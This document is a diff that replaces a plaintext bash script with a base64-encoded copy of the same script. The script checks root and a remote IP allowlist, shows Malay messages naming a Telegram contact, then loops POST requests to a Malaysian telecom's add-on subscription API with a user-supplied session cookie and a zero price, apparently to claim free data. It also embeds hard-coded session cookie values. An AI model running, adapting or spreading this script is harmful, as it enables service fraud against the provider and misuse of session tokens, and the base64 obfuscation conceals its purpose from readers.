@@ -1,52 +1,27 @@
-#!/bin/bash
-
-clear
-if [ "${EUID}" -ne 0 ]; then
-		echo "You need to run this script as root"
-		exit 1
-fi
-if [ "$(systemd-detect-virt)" == "openvz" ]; then
-		echo "OpenVZ is not supported"
-		exit 1
-fi
-red='\e[1;31m'
-green='\e[0;32m'
-NC='\e[0m'
-MYIP=$(wget -qO- ipinfo.io/ip);
-IZIN=$( curl https://raw.githubusercontent.com/Gasstrum/digi/main/spam | grep $MYIP )
-if [ $MYIP = $IZIN ]; then
-clear
-echo -e "${green}Tahniah! Anda Dibenarkan menggunakan Gasstrum...${NC}"
-else
-clear
-echo ""
-echo '                            ...                               '
-echo '        Anda Tidak Dibenarkan Menggunakan Script ini!         '
-echo '                            ...                               '
-echo '    Hubungi Saya di Telegram Untuk Mendapatkan Kebenaran!     '
-echo '                        t.me/gasstrum     '
-sleep 20
-exit 0
-fi
-
-clear
-read -p "Berapa loop : " loop
-read -p "Salin SSI : " cookie
-
-# Send 3gb
-for ((i=1;i<=$loop;i++)); do curl --request POST \
-  --url https://mydigiapp.digi.com.my/api/addons/subscribe \
-  --header 'Accept: application/json' \
-  --header 'Content-Type: application/json' \
-  --header "Cookie: sid=$cookie" \
-  --header 'Host: mydigiapp.digi.com.my' \
-  --header 'User-Agent: okhttp/3.12.1' \
-  --cookie 'dtCookie=7%24142BE649ABB3B3A9B91F2EC9C9C6D4E0; sid=s%253A822K4_WDvAEEykcaORev9EvHNddCU9KK.oiPhRWTA6hUYg%252B3f6VgGzdQ9GlUZvdzm1u6ACGfShkw' \
-  --data '{
-  "offerId": "90008074",
-  "isFreebie": false,
-  "force": false,
-  "price": "0.00"
-}'
-sleep 20
-done
+IyEvYmluL2Jhc2gKCmNsZWFyCmlmIFsgIiR7RVVJRH0iIC1uZSAwIF07IHRoZW4KCQllY2hvICJZ
+b3UgbmVlZCB0byBydW4gdGhpcyBzY3JpcHQgYXMgcm9vdCIKCQlleGl0IDEKZmkKaWYgWyAiJChz
+eXN0ZW1kLWRldGVjdC12aXJ0KSIgPT0gIm9wZW52eiIgXTsgdGhlbgoJCWVjaG8gIk9wZW5WWiBp
+cyBub3Qgc3VwcG9ydGVkIgoJCWV4aXQgMQpmaQpyZWQ9J1xlWzE7MzFtJwpncmVlbj0nXGVbMDsz
+Mm0nCk5DPSdcZVswbScKTVlJUD0kKHdnZXQgLXFPLSBpcGluZm8uaW8vaXApOwpJWklOPSQoIGN1
+cmwgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dhc3N0cnVtL2RpZ2kvbWFpbi9z
+cGFtIHwgZ3JlcCAkTVlJUCApCmlmIFsgJE1ZSVAgPSAkSVpJTiBdOyB0aGVuCmNsZWFyCmVjaG8g
+LWUgIiR7Z3JlZW59VGFobmlhaCEgQW5kYSBEaWJlbmFya2FuIG1lbmdndW5ha2FuIEdhc3N0cnVt
+Li4uJHtOQ30iCmVsc2UKY2xlYXIKZWNobyAiIgplY2hvICcgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgLi4uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcKZWNobyAnICAgICAgICBB
+bmRhIFRpZGFrIERpYmVuYXJrYW4gTWVuZ2d1bmFrYW4gU2NyaXB0IGluaSEgICAgICAgICAnCmVj
+aG8gJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAuLi4gICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgJwplY2hvICcgICAgSHVidW5naSBTYXlhIGRpIFRlbGVncmFtIFVudHVrIE1lbmRh
+cGF0a2FuIEtlYmVuYXJhbiEgICAgICcKZWNobyAnICAgICAgICAgICAgICAgICAgICAgICAgdC5t
+ZS9nYXNzdHJ1bSAgICAgJwpzbGVlcCAyMApleGl0IDAKZmkKCmNsZWFyCnJlYWQgLXAgIkJlcmFw
+YSBsb29wIDogIiBsb29wCnJlYWQgLXAgIlNhbGluIFNTSSA6ICIgY29va2llCgojIFNlbmQgM2di
+CmZvciAoKGk9MTtpPD0kbG9vcDtpKyspKTsgZG8gY3VybCAtLXJlcXVlc3QgUE9TVCBcCiAgLS11
+cmwgaHR0cHM6Ly9teWRpZ2lhcHAuZGlnaS5jb20ubXkvYXBpL2FkZG9ucy9zdWJzY3JpYmUgXAog
+IC0taGVhZGVyICdBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24nIFwKICAtLWhlYWRlciAnQ29udGVu
+dC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyBcCiAgLS1oZWFkZXIgIkNvb2tpZTogc2lkPSRjb29r
+aWUiIFwKICAtLWhlYWRlciAnSG9zdDogbXlkaWdpYXBwLmRpZ2kuY29tLm15JyBcCiAgLS1oZWFk
+ZXIgJ1VzZXItQWdlbnQ6IG9raHR0cC8zLjEyLjEnIFwKICAtLWNvb2tpZSAnZHRDb29raWU9NyUy
+NDE0MkJFNjQ5QUJCM0IzQTlCOTFGMkVDOUM5QzZENEUwOyBzaWQ9cyUyNTNBODIySzRfV0R2QUVF
+eWtjYU9SZXY5RXZITmRkQ1U5S0sub2lQaFJXVEE2aFVZZyUyNTJCM2Y2VmdHemRROUdsVVp2ZHpt
+MXU2QUNHZlNoa3cnIFwKICAtLWRhdGEgJ3sKICAib2ZmZXJJZCI6ICI5MDAwODA3NCIsCiAgImlz
+RnJlZWJpZSI6IGZhbHNlLAogICJmb3JjZSI6IGZhbHNlLAogICJwcmljZSI6ICIwLjAwIgp9Jwpz
+bGVlcCAyMApkb25l
